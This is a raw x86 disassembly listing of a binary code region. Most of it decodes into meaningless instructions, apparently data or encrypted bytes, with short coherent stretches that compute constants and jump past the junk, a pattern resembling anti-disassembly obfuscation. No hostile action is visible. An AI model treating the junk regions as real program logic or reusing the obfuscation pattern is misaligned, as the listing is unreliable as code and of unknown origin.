  41c290:	adc    DWORD PTR [ecx-0x4f],edx
  41c293:	mov    al,ds:0xf4a4d130
  41c298:	test   BYTE PTR [esi+0x3c],dh
  41c29b:	sbb    edx,DWORD PTR [ebp+0x4b76cdbe]
  41c2a1:	imul   esp,DWORD PTR [esi+0x32],0x9976f9eb
  41c2a8:	adc    DWORD PTR [ebx],esi
  41c2aa:	cdq    
  41c2ab:	shr    DWORD PTR [eax+edi*2+0x2e],0x11
  41c2b0:	jge    0x41c317
  41c2b2:	mov    WORD PTR [eax],?
  41c2b4:	mov    dl,0xfc
  41c2b6:	add    DWORD PTR [esi+0x20e477d4],0x12
  41c2bd:	push   cs
  41c2be:	loopne 0x41c2e9
  41c2c0:	adc    esi,edi
  41c2c2:	mov    al,ds:0x1602fcd2
  41c2c7:	mov    WORD PTR [edi],fs
  41c2c9:	add    eax,0x34c2b813
  41c2ce:	in     al,dx
  41c2cf:	jmp    0xf29f:0x9c738c02
  41c2d6:	popa   
  41c2d7:	leave  
  41c2d8:	and    ebp,DWORD PTR [ecx-0xd]
  41c2db:	mov    eax,0x9b3cf258
  41c2e0:	stos   DWORD PTR es:[edi],eax
  41c2e1:	lods   al,BYTE PTR ds:[esi]
  41c2e2:	loop   0x41c310
  41c2e4:	ja     0x41c2d9
  41c2e6:	inc    edx
  41c2e7:	neg    BYTE PTR [esi-0x77273858]
  41c2ed:	xchg   edi,eax
  41c2ee:	call   0xa91f:0x89823807
  41c2f5:	add    edx,DWORD PTR [edx]
  41c2f7:	pop    ebp
  41c2f8:	mov    edx,0xbfa24e35
  41c2fd:	adc    al,0x1c
  41c2ff:	push   edx
  41c300:	ret    0x15d5
  41c303:	mov    eax,ds:0x1bf93849
  41c308:	xor    al,0xf5
  41c30a:	cmc    
  41c30b:	popa   
  41c30c:	or     BYTE PTR [ecx],ah
  41c30e:	neg    BYTE PTR [ebp-0x18]
  41c311:	push   edx
  41c312:	mov    edx,eax
  41c314:	xor    ecx,0xa7a7a095
  41c31a:	add    bh,BYTE PTR [ebp-0x48154d3]
  41c320:	fcomp  DWORD PTR [edx]
  41c322:	aam    0x98
  41c324:	mov    cl,0x4a
  41c326:	cmc    
  41c327:	addr16 cdq 
  41c329:	loop   0x41c396
  41c32b:	icebp  
  41c32c:	lods   al,BYTE PTR ds:[esi]
  41c32d:	repnz in eax,0xea
  41c330:	fild   QWORD PTR [ecx-0x666df16d]
  41c336:	pop    ss
  41c337:	pop    ebx
  41c338:	cmc    
  41c339:	mov    esi,0x32b23539
  41c33e:	mov    ebx,0x5bb3e795
  41c343:	sub    esp,DWORD PTR [ecx-0x2a]
  41c346:	mov    DWORD PTR [ebx-0x8817a5a],eax
  41c34c:	mov    ecx,0xef2576a
  41c351:	xor    DWORD PTR [ebx],ecx
  41c353:	xor    eax,0xdec39fa2
  41c358:	xchg   ebx,eax
  41c359:	(bad)  
  41c35b:	mov    edx,0xef4357bd
  41c360:	push   ds
  41c361:	or     al,0x98
  41c363:	lds    edx,FWORD PTR [eax]
  41c365:	add    eax,0xa4c2abfc
  41c36a:	push   ds
  41c36b:	(bad)  
  41c36c:	faddp  st(0),st
  41c36e:	push   0x2ecb5f1c
  41c373:	daa    
  41c374:	cmp    BYTE PTR [bp-0x74a6],0x39
  41c37a:	xchg   ebp,eax
  41c37b:	ja     0x41c3bb
  41c37d:	out    dx,eax
  41c37e:	ficomp DWORD PTR [ebx]
  41c380:	std    
  41c381:	jne    0x41c3eb
  41c383:	sti    
  41c384:	cmp    al,0xda
  41c386:	into   
  41c387:	mov    al,0xc9
  41c389:	add    esi,DWORD PTR [edi]
  41c38b:	test   DWORD PTR [ecx-0x288da71e],ecx
  41c391:	imul   ecx,DWORD PTR [ecx],0xffffff91
  41c394:	jl     0x41c40f
  41c396:	fisttp DWORD PTR es:[ebp+0x7c]
  41c39a:	repz out dx,al
  41c39c:	mov    cl,0xb0
  41c39e:	(bad)  
  41c3a1:	jmp    DWORD PTR [ecx+0x6d]
  41c3a4:	lock pop ecx
  41c3a6:	pop    eax
  41c3a7:	cwde   
  41c3a8:	jmp    0x41c359
  41c3aa:	xchg   DWORD PTR ds:0x50e092fb,esi
  41c3b0:	and    cl,BYTE PTR ds:[edi]
  41c3b3:	cmp    eax,0xf013b44
  41c3b8:	test   DWORD PTR [eax+eax*1+0x44c60000],esi
  41c3bf:	and    al,0x18
  41c3c1:	and    esi,eax
  41c3c3:	inc    esp
  41c3c4:	and    al,0x10
  41c3c6:	or     eax,0x2444b60f
  41c3cb:	adc    BYTE PTR [edi],cl
  41c3cd:	mov    dh,0x4c
  41c3cf:	and    al,0x18
  41c3d1:	and    eax,0x8c
  41c3d6:	or     eax,ecx
  41c3d8:	mov    BYTE PTR [esp+0x18],al
  41c3dc:	mov    al,ds:0x422746
  41c3e1:	mov    cl,BYTE PTR [esp+0x18]
  41c3e5:	add    al,0x4
  41c3e7:	xor    al,0x6d
  41c3e9:	add    al,0x27
  41c3eb:	xor    al,0xe3
  41c3ed:	cmp    cl,al
  41c3ef:	ja     0x41c471
  41c3f5:	mov    eax,ds:0x42274c
  41c3fa:	mov    ecx,DWORD PTR ds:0x422748
  41c400:	and    eax,0x2047
  41c405:	sub    eax,ecx
  41c407:	add    eax,0xd93d
  41c40c:	shr    eax,1
  41c40e:	mov    DWORD PTR [esp+0x18],eax
  41c412:	mov    DWORD PTR [esp+0x20],0x3206
  41c41a:	mov    eax,DWORD PTR [esp+0x20]
  41c41e:	and    eax,0x62c8
  41c423:	push   0x5
  41c425:	xor    edx,edx
  41c427:	pop    ecx
  41c428:	div    ecx
  41c42a:	mov    ecx,DWORD PTR [esp+0x18]
  41c42e:	imul   eax,eax,0x679
  41c434:	cmp    ecx,eax
  41c436:	je     0x41c471
  41c43c:	mov    eax,DWORD PTR [esp+0x58]
  41c440:	mov    ecx,DWORD PTR [esp+0x5c]
  41c444:	shrd   eax,ecx,0x2
  41c448:	shr    ecx,0x2
  41c44b:	mov    ecx,DWORD PTR [esp+0x58]
  41c44f:	mov    edx,DWORD PTR [esp+0x5c]
  41c453:	xor    eax,0x32e26d9d
  41c458:	xor    edx,edx
  41c45a:	or     edx,eax
  41c45c:	push   edx
  41c45d:	push   esi
  41c45e:	push   edi
  41c45f:	lea    eax,[esp+0x6c]
  41c463:	push   eax
  41c464:	lea    eax,[esp+0x68]
  41c468:	push   eax
  41c469:	shl    ecx,0x1e
  41c46c:	call   0x4113ee
  41c471:	push   DWORD PTR [esp+0x64]
  41c475:	push   DWORD PTR [esp+0x64]
  41c479:	push   DWORD PTR [esp+0x64]
  41c47d:	push   DWORD PTR [esp+0x64]
  41c481:	call   0x412e81
  41c486:	mov    edx,DWORD PTR [esp+0x58]
  41c48a:	mov    eax,DWORD PTR [esp+0x5c]
  41c48e:	mov    ecx,DWORD PTR [esp+0x58]
  41c492:	mov    edi,DWORD PTR [esp+0x5c]
  41c496:	shrd   edx,eax,0x2
  41c49a:	shr    eax,0x2
  41c49d:	shl    ecx,0x1e
  41c4a0:	xor    ecx,ecx
  41c4a2:	mov    eax,0x32e26d9d
  41c4a7:	xor    edx,eax
  41c4a9:	or     ecx,edx
  41c4ab:	mov    edx,DWORD PTR [esp+0x38]
  41c4af:	mov    DWORD PTR [edx],ecx
  41c4b1:	mov    ecx,DWORD PTR [esp+0x58]
  41c4b5:	jmp    0x41c74b
  41c4ba:	in     eax,0x49
  41c4bc:	je     0x41c517
  41c4be:	jge    0x41c53d
  41c4c0:	in     al,dx
  41c4c1:	jge    0x41c4cc
  41c4c3:	scas   al,BYTE PTR es:[edi]
  41c4c4:	or     DWORD PTR ds:0x3baf8e63,eax
  41c4ca:	enter  0xc166,0xbb
  41c4ce:	test   al,0xbf
  41c4d0:	mov    ebx,0x9d24b9bb
  41c4d5:	or     DWORD PTR [ebx+0x55a27c2f],esi
  41c4db:	push   esi
  41c4dc:	xchg   esi,eax
  41c4dd:	inc    ebx
  41c4de:	rcl    DWORD PTR ds:0xfdd3ff40,cl
  41c4e4:	dec    esp
  41c4e5:	int3   
  41c4e6:	lea    edx,[ebx+ebx*2-0x10]
  41c4ea:	in     al,0x7f
  41c4ec:	adc    dl,BYTE PTR [esi+0x1c7aecd8]
  41c4f2:	test   al,0xd5
  41c4f4:	mov    ah,0x0
  41c4f6:	jb     0x41c51e
  41c4f8:	or     DWORD PTR [edx],edi
  41c4fa:	lods   eax,DWORD PTR ds:[esi]
  41c4fb:	push   ebx
  41c4fc:	cmp    eax,0xbeb5c86d
  41c501:	pop    eax
  41c502:	cmp    BYTE PTR [ebx-0x15dcb696],dl
  41c508:	mov    esp,0x9a47fcc
  41c50d:	jae    0x41c4e3
  41c50f:	lea    eax,[ebx-0x2daa1dd2]
  41c515:	inc    edi
  41c516:	bound  edx,QWORD PTR [ecx-0x7]
  41c519:	shl    bh,0x6
  41c51c:	jmp    FWORD PTR [esi-0x3b]
  41c51f:	and    eax,0xfcdaec8d
  41c524:	dec    esi
  41c525:	and    al,0x55
  41c527:	sbb    ch,BYTE PTR [edx+0x701f07ae]
  41c52d:	sub    esi,eax
  41c52f:	pop    esi
  41c530:	std    
  41c531:	mov    dl,0x20
  41c533:	test   edx,esp
  41c535:	loopne 0x41c546
  41c537:	fwait
  41c538:	aam    0x0
  41c53a:	jb     0x41c581
  41c53c:	dec    esp
  41c53d:	jnp    0x41c502
  41c53f:	fdiv   QWORD PTR gs:[ebp+0xd961780]
  41c546:	cmc    
  41c547:	push   edi
  41c548:	push   ds
  41c549:	mov    edi,0x3c954cdd
  41c54e:	dec    esp
  41c54f:	shl    DWORD PTR [ecx],1
  41c551:	jb     0x41c53f
  41c553:	clc    
  41c554:	dec    esi
  41c555:	and    eax,0x63aad321
  41c55a:	lea    edx,[eax+0x62aa3759]
  41c560:	test   eax,0xe889e3cf
  41c565:	or     al,0x4c
  41c567:	es retf 
  41c569:	pop    eax
  41c56a:	or     eax,0x34dae6ae
  41c56f:	sub    DWORD PTR [esi+0xe],edi
  41c572:	xor    DWORD PTR ds:0xb082d6f1,0xffffffb4
  41c579:	imul   DWORD PTR [ecx-0x2c]
  41c57c:	mov    ch,0xcf
  41c57e:	and    DWORD PTR [esi],ebx
  41c580:	jmp    0xe177:0x880b30c9
  41c587:	pop    eax
  41c588:	pop    ecx
  41c589:	fadd   st,st(6)
  41c58b:	pop    ecx
  41c58c:	test   edi,0x3f0d016a
  41c592:	(bad)  
  41c594:	les    edi,FWORD PTR [eax+0x68]
  41c597:	pushf  
  41c598:	mov    ch,0x51
  41c59a:	dec    edx
  41c59b:	push   es
  41c59c:	pop    edx
  41c59d:	push   ebp
  41c59e:	retf   
  41c59f:	mov    cl,0x6d
  41c5a1:	xor    ch,BYTE PTR [esp+eax*8+0x568bed33]
  41c5a8:	or     al,0xc8
  41c5aa:	inc    esi
  41c5ab:	fwait
  41c5ac:	adc    al,0xe9
  41c5ae:	lods   al,BYTE PTR cs:[esi]
  41c5b0:	cmp    DWORD PTR [ebx-0x2b],esp
  41c5b3:	loopne 0x41c5c1
  41c5b5:	pusha  
  41c5b6:	cmp    BYTE PTR [edi*8-0x7a4133dc],bh
  41c5bd:	and    ebp,ebx
  41c5bf:	add    al,0x55
  41c5c1:	in     al,0x49
  41c5c3:	ret    
  41c5c4:	je     0x41c5df
  41c5c6:	sbb    al,0x8d
  41c5c8:	cli    
  41c5c9:	adc    al,0xcb
  41c5cb:	mov    edx,0xc46d70d
  41c5d0:	adc    edi,edx
  41c5d2:	test   al,0xca
  41c5d4:	xchg   ecx,eax
  41c5d5:	cmp    al,BYTE PTR [eax-0x30]
  41c5d8:	cmp    BYTE PTR [esi-0x23],dh
  41c5db:	cmp    al,0x8e
  41c5dd:	in     eax,0x9f
  41c5df:	test   ah,al
  41c5e1:	ret    0x70b4
  41c5e4:	inc    eax
  41c5e5:	imul   esi,DWORD PTR [ebp+0x45d76e1a],0x16a00ab3
  41c5ef:	addr16 (bad) 
  41c5f1:	mov    dl,BYTE PTR [esi+0x7644b252]
  41c5f7:	shl    DWORD PTR ss:[ebx],0x75
  41c5fb:	cmp    eax,0x99864162
  41c600:	sbb    ebx,edi
  41c602:	sbb    edx,DWORD PTR [esp+ecx*2-0x4]
  41c606:	retf   
  41c607:	loop   0x41c5a4
  41c609:	mov    WORD PTR [edx],?
  41c60b:	pop    esi
  41c60c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c60d:	xchg   DWORD PTR [ebx-0x77a5929e],esp
  41c613:	sti    
  41c614:	cwde   
  41c615:	pop    ss
  41c616:	(bad)  
  41c617:	scas   al,BYTE PTR es:[edi]
  41c618:	xor    ch,BYTE PTR [eax+eiz*8+0x3fd83be1]
  41c61f:	jle    0x41c5fc
  41c621:	test   eax,0x4cc09803
  41c626:	dec    esi
  41c627:	and    eax,0x52ceae60
  41c62c:	fdiv   QWORD PTR [eax-0x80]
  41c62f:	or     eax,0x89ebbe3b
  41c634:	push   ss
  41c635:	rcl    BYTE PTR [ecx-0x2b],0x92
  41c639:	mov    bl,0xf1
  41c63b:	mov    ah,0xe6
  41c63d:	call   0x74d6:0x38bf22ff
  41c644:	mov    ecx,0x98971574
  41c649:	mov    esi,0x5fc29feb
  41c64e:	xchg   esi,eax
  41c64f:	pop    ecx
  41c650:	xchg   edx,eax
  41c651:	and    eax,0x5e573861
  41c656:	dec    esp
  41c657:	sbb    cl,ch
  41c659:	cmp    dl,BYTE PTR [edx]
  41c65b:	in     eax,0x50
  41c65d:	(bad)  [eax+0x54]
  41c660:	(bad)  
  41c661:	clc    
  41c662:	std    
  41c663:	pop    ebx
  41c664:	add    dh,dh
  41c666:	jl     0x41c689
  41c668:	nop
  41c669:	and    eax,0x4b1d6bc9
  41c66e:	jne    0x41c637
  41c670:	sbb    ch,al
  41c672:	test   BYTE PTR [edx],0x2a
  41c675:	jge    0x41c6c3
  41c677:	imul   eax,DWORD PTR [esi-0x2c],0xffffffb6
  41c67b:	fimul  DWORD PTR [eax]
  41c67d:	cwde   
  41c67e:	stos   BYTE PTR es:[edi],al
  41c67f:	push   ebx
  41c680:	push   edx
  41c681:	sti    
  41c682:	mov    bl,0x52
  41c684:	loopne 0x41c6f5
  41c686:	lods   eax,DWORD PTR ds:[esi]
  41c687:	cmp    ecx,DWORD PTR [eax-0x1ea6b6ac]
  41c68d:	bound  eax,QWORD PTR ds:0x339c48bb
  41c693:	xlat   BYTE PTR ds:[ebx]
  41c694:	je     0x41c6ef
  41c696:	(bad)  
  41c697:	loopne 0x41c628
  41c699:	jbe    0x41c64e
  41c69b:	in     eax,dx
  41c69c:	jle    0x41c683
  41c69e:	adc    edx,edi
  41c6a0:	sbb    DWORD PTR [esi],eax
  41c6a2:	pop    edx
  41c6a3:	dec    edx
  41c6a4:	dec    esi
  41c6a5:	in     eax,dx
  41c6a6:	aad    0x47
  41c6a8:	mov    cl,cl
  41c6aa:	cwde   
  41c6ab:	inc    ecx
  41c6ac:	inc    eax
  41c6ad:	dec    esp
  41c6ae:	pop    ebx
  41c6af:	cmp    BYTE PTR [esi+edi*2],dh
  41c6b2:	push   es
  41c6b3:	or     al,0x9b
  41c6b5:	shl    BYTE PTR [edi*2+0x438eb2fb],1
  41c6bc:	jmp    0x41c735
  41c6be:	mov    edi,0x8d06e44f
  41c6c3:	stos   DWORD PTR es:[edi],eax
  41c6c4:	daa    
  41c6c5:	adc    esi,esp
  41c6c7:	std    
  41c6c8:	pop    ebx
  41c6c9:	pop    edx
  41c6ca:	inc    ebp
  41c6cb:	fcomp  QWORD PTR [eax-0x4557b6f7]
  41c6d1:	mov    DWORD PTR [ebx+0x79],ecx
  41c6d4:	xchg   ecx,eax
  41c6d5:	cmp    eax,0x250d7bf8
  41c6da:	fmul   QWORD PTR [eax]
  41c6dc:	pop    es
  41c6dd:	out    dx,al
  41c6de:	cmp    edx,DWORD PTR [ecx+0x6a]
  41c6e1:	pop    esp
  41c6e2:	arpl   WORD PTR [eax-0x20c229d1],bx
  41c6e8:	scas   eax,DWORD PTR es:[edi]
  41c6e9:	jb     0x41c749
  41c6eb:	cdq    
  41c6ec:	sub    ebp,esp
  41c6ee:	adc    DWORD PTR [ebp+eax*8-0x70679d76],0xa
  41c6f6:	mov    ds:0xa4d803ca,al
  41c6fb:	pop    ebx
  41c6fc:	inc    eax
  41c6fd:	mov    eax,0xc803d842
  41c702:	fs jge 0x41c68b
  41c705:	add    al,0xef
  41c707:	sub    al,0xaa
  41c709:	jo     0x41c74e
  41c70b:	mov    WORD PTR ss:[esi-0x7db9322b],gs
  41c712:	add    DWORD PTR [esi-0x69],esi
  41c715:	sub    edi,DWORD PTR [eax]
  41c717:	dec    ecx
  41c718:	imul   DWORD PTR [esi-0x5211b762]
  41c71e:	jo     0x41c714
  41c720:	std    
  41c721:	mov    bl,ch
  41c723:	add    al,BYTE PTR [esi+edx*4]
  41c726:	and    bl,bh
  41c728:	jmp    0x5b3:0x3668849d
  41c72f:	push   eax
  41c730:	and    dh,BYTE PTR [ecx]
  41c732:	xchg   esp,eax
  41c733:	sbb    ecx,DWORD PTR [edi+0x79]
  41c736:	push   edx
  41c737:	cmp    ebp,DWORD PTR [ecx]
  41c739:	sub    al,0xec
  41c73b:	or     ecx,DWORD PTR [eax+0x3a89e439]
  41c741:	aad    0xe4
  41c743:	push   ss
  41c744:	xchg   BYTE PTR [eax+0x3c],dh
  41c747:	mov    ?,WORD PTR [ebx]
  41c749:	xchg   BYTE PTR [edx],dl
  41c74b:	mov    edx,DWORD PTR [esp+0x5c]
  41c74f:	shrd   ecx,edx,0x2
  41c753:	xor    ecx,eax
  41c755:	mov    eax,DWORD PTR [esp+0x58]
  41c759:	shl    eax,0x1e
  41c75c:	shr    edx,0x2
  41c75f:	mov    edx,DWORD PTR [esp+0x5c]
  41c763:	xor    eax,eax
  41c765:	or     eax,ecx
  41c767:	mov    ecx,DWORD PTR [esp+0x34]
  41c76b:	mov    DWORD PTR [ecx],eax
  41c76d:	mov    eax,DWORD PTR [esp+0x34]
  41c771:	mov    ecx,DWORD PTR [esp+0x34]
  41c775:	mov    eax,DWORD PTR [eax]
  41c777:	cmp    eax,DWORD PTR [ecx]
  41c779:	jne    0x41cd50
  41c77f:	mov    eax,DWORD PTR [esp+0x38]
  41c783:	mov    ecx,DWORD PTR [esp+0x38]
  41c787:	mov    eax,DWORD PTR [eax]
  41c789:	cmp    eax,DWORD PTR [ecx]
  41c78b:	jne    0x41cd50
  41c791:	movzx  eax,WORD PTR ds:0x422754
  41c798:	jmp    0x41ca2e
  41c79d:	jno    0x41c7ec
  41c79f:	lods   eax,DWORD PTR ds:[esi]
  41c7a0:	bound  edi,QWORD PTR [ebp+0x305db5a2]
  41c7a6:	mov    esp,0x8ed16f93
  41c7ab:	out    0x6f,al
  41c7ad:	scas   eax,DWORD PTR es:[edi]
  41c7ae:	push   0xffffffc1
  41c7b0:	mov    ebx,0xbbbbbfa8
  41c7b5:	rcr    BYTE PTR [edx],1
  41c7b7:	jl     0x41c80c
  41c7b9:	add    DWORD PTR [ebp-0x536bd69c],eax
  41c7bf:	icebp  
  41c7c0:	adc    esp,esi
  41c7c2:	lods   eax,DWORD PTR ds:[esi]
  41c7c3:	sbb    edi,0x38
  41c7c6:	and    BYTE PTR [esp+ecx*8],dh
  41c7c9:	mov    ds:0xe116344e,eax
  41c7ce:	xchg   edx,eax
  41c7cf:	test   DWORD PTR [esi],ebp
  41c7d1:	mov    BYTE PTR [bp+si+0x5084],dh
  41c7d6:	mov    BYTE PTR [ebp-0x1b1d80bd],ch
  41c7dc:	ja     0x41c762
  41c7de:	loop   0x41c76c
  41c7e0:	dec    esi
  41c7e1:	imul   esp,DWORD PTR [eax+0x9],0x1ee5739c
  41c7e8:	dec    ebp
  41c7e9:	fwait
  41c7ea:	mov    eax,ds:0x351a9dc2
  41c7ef:	lock and al,0x43
  41c7f2:	cdq    
  41c7f3:	pop    edx
  41c7f4:	or     esp,0x45a018d9
  41c7fa:	mov    ebx,0xc9a0f911
  41c7ff:	aam    0xe9
  41c801:	cmp    eax,0x225881fb
  41c806:	mov    al,0xd6
  41c808:	ja     0x41c7a2
  41c80a:	or     edx,ecx
  41c80c:	aad    0xe3
  41c80e:	iret   
  41c80f:	jmp    0xd2a6:0x92fc7d77
  41c816:	in     al,dx
  41c817:	rol    ebx,cl
  41c819:	rcl    DWORD PTR [ebp+eax*1+0x439d5b2],0xec
  41c821:	cmp    ch,BYTE PTR [ebx]
  41c823:	call   0x2244:0xa4e7
  41c829:	dec    edi
  41c82a:	repz or esi,DWORD PTR [ebx-0x421ae935]
  41c831:	sbb    ebx,DWORD PTR [ebp-0x2df66ee5]
  41c837:	xor    eax,0x79ad0a03
  41c83c:	popf   
  41c83d:	mov    bh,0xc6
  41c83f:	sub    DWORD PTR [edx+0x23],esp
  41c842:	stc    
  41c843:	pop    esp
  41c844:	stos   BYTE PTR es:[edi],al
  41c845:	jmp    0xe3035cde
  41c84a:	lahf   
  41c84b:	lea    esi,[ecx]
  41c84d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c84e:	stos   BYTE PTR es:[edi],al
  41c84f:	pop    esi
  41c850:	mov    esi,0x96fe3b5d
  41c855:	adc    BYTE PTR [eax-0x63427f34],ch
  41c85b:	push   esp
  41c85c:	cmp    eax,0xdf1f2951
  41c861:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c862:	mov    ebx,0xc8c19868
  41c867:	sbb    BYTE PTR [edx],0xfc
  41c86a:	dec    edx
  41c86b:	mov    ecx,0xb63bb1c1
  41c870:	push   ebp
  41c871:	mov    bl,0xc2
  41c873:	mov    al,ds:0x520c7bfb
  41c878:	dec    ecx
  41c879:	sahf   
  41c87a:	mul    BYTE PTR [ebx]
  41c87c:	test   BYTE PTR [edi+ecx*8],0xb0
  41c880:	push   esp
  41c881:	leave  
  41c882:	push   0xa65dd12b
  41c887:	xchg   ebx,eax
  41c888:	adc    ebp,DWORD PTR [eax-0x76e9d07c]
  41c88e:	rcr    BYTE PTR [ebx-0x6a],cl
  41c891:	jae    0x41c86e
  41c893:	scas   al,BYTE PTR es:[edi]
  41c894:	aad    0xb5
  41c896:	mov    bh,0xc6
  41c898:	adc    dl,BYTE PTR [ecx+0x50]
  41c89b:	pusha  
  41c89c:	or     ecx,DWORD PTR [ecx+0x4d]
  41c89f:	sub    DWORD PTR [eax],esp
  41c8a1:	push   edx
  41c8a2:	mov    DWORD PTR [ebx],ebx
  41c8a4:	call   0x9729:0x7b86cc58
  41c8ab:	cmp    dl,cl
  41c8ad:	sub    al,0xf5
  41c8af:	ret    0x16c2
  41c8b2:	pop    ecx
  41c8b3:	xchg   ebp,eax
  41c8b4:	sub    al,0x4a
  41c8b6:	dec    eax
  41c8b7:	pop    es
  41c8b8:	cmp    eax,0xb595c5f7
  41c8bd:	pop    edi
  41c8be:	adc    eax,edi
  41c8c0:	jns    0x41c8ad
  41c8c2:	mov    bl,0x3e
  41c8c4:	cmp    BYTE PTR [esi],0xdf
  41c8c7:	xchg   ebp,eax
  41c8c8:	lahf   
  41c8c9:	aaa    
  41c8ca:	ret    0x6db0
  41c8cd:	cmp    al,0x4c
  41c8cf:	xor    eax,0xed1d829
  41c8d4:	(bad)  
  41c8d5:	pop    ss
  41c8d6:	mov    edx,0xee685985
  41c8db:	xchg   esi,eax
  41c8dc:	adc    DWORD PTR [esi-0x4d41b751],ebp
  41c8e2:	out    0x87,al
  41c8e4:	data16 jl 0x41c8ce
  41c8e7:	outs   dx,DWORD PTR ds:[esi]
  41c8e8:	cwde   
  41c8e9:	push   cx
  41c8eb:	jae    0x41c916
  41c8ed:	into   
  41c8ee:	cmp    BYTE PTR [esi+0x32632472],ah
  41c8f4:	push   ds
  41c8f5:	cmp    al,0xe1
  41c8f7:	mov    ebp,0x8204b0d4
  41c8fc:	and    eax,0x5c703e1c
  41c901:	adc    al,0x6e
  41c903:	adc    edx,DWORD PTR [edx]
  41c905:	ins    DWORD PTR es:[edi],dx
  41c906:	mov    esi,0x108ca210
  41c90b:	lea    edx,[esi+0xb]
  41c90e:	outs   dx,DWORD PTR ds:[esi]
  41c90f:	push   ecx
  41c910:	dec    esi
  41c911:	dec    eax
  41c912:	inc    ecx
  41c913:	jle    0x41c8b1
  41c915:	fsub   QWORD PTR [edi-0x60890764]
  41c91b:	int3   
  41c91c:	pop    ebx
  41c91d:	cmp    eax,DWORD PTR [ebx]
  41c91f:	(bad)  
  41c920:	push   ebp
  41c921:	ins    BYTE PTR es:[edi],dx
  41c922:	jb     0x41c925
  41c924:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c925:	add    esi,DWORD PTR [edi]
  41c927:	ror    BYTE PTR [edx-0x69f6b77f],cl
  41c92d:	out    0xcd,al
  41c92f:	scas   al,BYTE PTR es:[edi]
  41c930:	jl     0x41c8fa
  41c932:	test   DWORD PTR [ecx+0x46953390],eax
  41c938:	pop    ebx
  41c939:	inc    ecx
  41c93a:	or     eax,0x92649aad
  41c93f:	mov    ecx,0x81617d68
  41c944:	lods   eax,DWORD PTR ds:[esi]
  41c945:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c946:	inc    ecx
  41c947:	pop    ebx
  41c948:	xchg   edx,eax
  41c949:	cs icebp 
  41c94b:	pop    ss
  41c94c:	test   DWORD PTR [ebx-0x39],eax
  41c94f:	jle    0x41c96d
  41c951:	cld    
  41c952:	stos   BYTE PTR es:[edi],al
  41c953:	xchg   ebx,eax
  41c954:	push   ds
  41c955:	test   eax,0x309fcdc1
  41c95a:	adc    BYTE PTR ds:0x45a9d048,ch
  41c960:	push   ebx
  41c961:	push   ds
  41c962:	mov    eax,0x30373424
  41c967:	popf   
  41c968:	or     BYTE PTR [eax],0x7e
  41c96b:	xchg   edx,eax
  41c96c:	sbb    eax,DWORD PTR [ecx]
  41c96e:	test   eax,0x72964bb4
  41c973:	fsubr  DWORD PTR [edx]
  41c975:	sbb    BYTE PTR [esi+ecx*2-0x7a8ce5bc],ch
  41c97c:	call   0xf338:0xe2741078
  41c983:	and    al,0xb
  41c985:	xchg   eax,edi
  41c987:	js     0x41c96e
  41c989:	test   eax,0x6704babd
  41c98e:	mov    dl,0x45
  41c990:	int    0x8f
  41c992:	push   es
  41c993:	inc    ebx
  41c994:	and    al,0x41
  41c996:	loopne 0x41ca03
  41c998:	inc    ecx
  41c999:	rol    ch,cl
  41c99b:	sbb    BYTE PTR [eax],dl
  41c99d:	adc    edi,DWORD PTR [esi-0x56]
  41c9a0:	and    esp,DWORD PTR ds:0xd90edf48
  41c9a6:	loopne 0x41c9da
  41c9a8:	gs jge 0xc3d34d32
  41c9af:	cmp    edx,eax
  41c9b1:	fld    QWORD PTR [ebx]
  41c9b3:	outs   dx,DWORD PTR ds:[esi]
  41c9b4:	loope  0x41c989
  41c9b6:	in     al,0x5e
  41c9b8:	xchg   ebx,eax
  41c9b9:	push   es
  41c9ba:	cld    
  41c9bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9bc:	in     eax,dx
  41c9bd:	mov    ebp,0xfb2ed23d
  41c9c2:	shl    DWORD PTR [ebx],1
  41c9c4:	mov    cl,0xe9
  41c9c6:	sbb    BYTE PTR [ebx],cl
  41c9c8:	imul   ebx,DWORD PTR [ebp-0x57],0xa1068e58
  41c9cf:	loope  0x41ca15
  41c9d1:	(bad)  
  41c9d2:	or     ah,ah
  41c9d4:	sbb    BYTE PTR [ebp-0x272d424a],dl
  41c9da:	sbb    bl,BYTE PTR [esi+edx*8-0x12607108]
  41c9e1:	dec    ecx
  41c9e2:	or     DWORD PTR [ebp+0x5b],eax
  41c9e5:	add    BYTE PTR [eax],cl
  41c9e7:	test   al,0x58
  41c9e9:	cmp    ch,bl
  41c9eb:	(bad)  
  41c9ec:	jg     0x41ca48
  41c9ee:	sbb    DWORD PTR [ecx-0xf],edx
  41c9f1:	dec    DWORD PTR [edx]
  41c9f3:	fist   DWORD PTR [esi+ebp*8-0x51]
  41c9f7:	push   edi
  41c9f8:	enter  0xb47a,0xac
  41c9fc:	dec    eax
  41c9fd:	pop    ecx
  41c9fe:	xchg   ecx,eax
  41c9ff:	loope  0x41c9b4
  41ca01:	loopne 0x41ca0c
  41ca03:	mov    bh,0x24
  41ca05:	push   es
  41ca06:	test   BYTE PTR [esi+edi*4+0x6f551e4],dl
  41ca0d:	fisub  DWORD PTR [ecx+0x2e]
  41ca10:	or     al,0xd9
  41ca12:	scas   eax,DWORD PTR es:[edi]
  41ca13:	stos   DWORD PTR es:[edi],eax
  41ca14:	sbb    eax,0xd097d4df
  41ca19:	ror    DWORD PTR [edx-0x52a42345],0x5f
  41ca20:	test   dl,cl
  41ca22:	inc    ebx
  41ca23:	push   edx
  41ca24:	and    BYTE PTR [ecx+0x52],ah
  41ca27:	clc    
  41ca28:	add    al,0x9d
  41ca2a:	aam    0xaa
  41ca2c:	icebp  
  41ca2d:	sub    BYTE PTR [ecx+0x7448],bh
  41ca33:	and    ax,cx
  41ca36:	mov    ecx,0x721e
  41ca3b:	xor    ax,cx
  41ca3e:	mov    ecx,0x17da
  41ca43:	imul   ax,cx
  41ca47:	mov    cx,WORD PTR ds:0x422750
  41ca4e:	sub    ax,cx
  41ca51:	mov    ecx,0x37ac
  41ca56:	add    eax,0x257f
  41ca5b:	mov    WORD PTR [esp+0x20],ax
  41ca60:	mov    ax,ds:0x422760
  41ca66:	shr    ax,1
  41ca69:	and    ax,cx
  41ca6c:	jmp    0x41cd02
  41ca71:	jbe    0x41ca77
  41ca73:	popf   
  41ca74:	test   BYTE PTR [ebp-0x70c38863],bh
  41ca7a:	adc    edx,eax
  41ca7c:	sti    
  41ca7d:	sbb    al,0x9c
